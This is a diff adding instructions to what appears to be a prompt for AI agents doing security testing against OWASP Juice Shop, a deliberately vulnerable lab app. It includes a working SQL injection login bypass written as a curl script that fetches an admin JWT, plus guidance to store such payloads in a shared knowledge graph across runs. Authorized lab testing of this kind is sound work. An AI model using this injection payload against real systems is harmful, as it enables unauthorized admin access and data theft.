@@ -91,6 +91,68 @@ already covered, or insights that don't create new tasked work.
 
 ---
 
+## Build Your Own Tools
+
+You have a persistent workspace with `shell_exec` and `file_write`. Use them.
+**When you find yourself doing the same operation twice, write a script.**
+
+### During a session
+
+Write helper scripts to your workspace and reuse them:
+
+```bash
+# Example: wrap the auth setup you'll need for every exploit
+cat > ~/auth.sh << 'EOF'
+#!/bin/bash
+# Get admin JWT via SQLi bypass
+curl -s -X POST http://juice-shop:3000/rest/user/login \
+  -H 'Content-Type: application/json' \
+  -d '{"email":"'"'"' OR 1=1--","password":"x"}' \
+  | python3 -c "import json,sys; print(json.load(sys.stdin)['authentication']['token'])"
+EOF
+chmod +x ~/auth.sh
+
+# Then use it everywhere
+TOKEN=$(~/auth.sh)
+curl -H "Authorization: Bearer $TOKEN" http://juice-shop:3000/api/Users/
+```
+
+Build scripts for anything you repeat:
+- Auth setup (`auth.sh`, `forge-jwt.sh`)
+- Challenge count check (`score.sh`)
+- Common payload sequences (SQLi, null byte bypass, etc.)
+- Enumeration patterns you expect to run multiple times
+
+### Seed from the knowledge graph
+
+Before writing a script from scratch, query what prior runs already worked out:
+
+```
+query_knowledge("juice-shop authentication")
+query_knowledge("juice-shop SQLi payload")
+```
+
+If the graph has a working payload or technique from a prior run, use it
+directly in your script. Don't re-derive what's already known.
+
+### Contribute scripts and techniques back
+
+After a successful technique, contribute it so future runs start faster:
+
+```
+contribute_knowledge(
+  topic="juice-shop: auth script",
+  summary="Working auth.sh — SQLi bypass to get admin JWT. One-liner: ...",
+  kind="technique",
+  properties={"script": "...", "target": "POST /rest/user/login"}
+)
+```
+
+This compounds across engagements. Run 3 should start with working scripts,
+not blank workspaces.
+
+---
+
 ## Required Behaviors
 
 ### Knowledge Contribution (all agents)
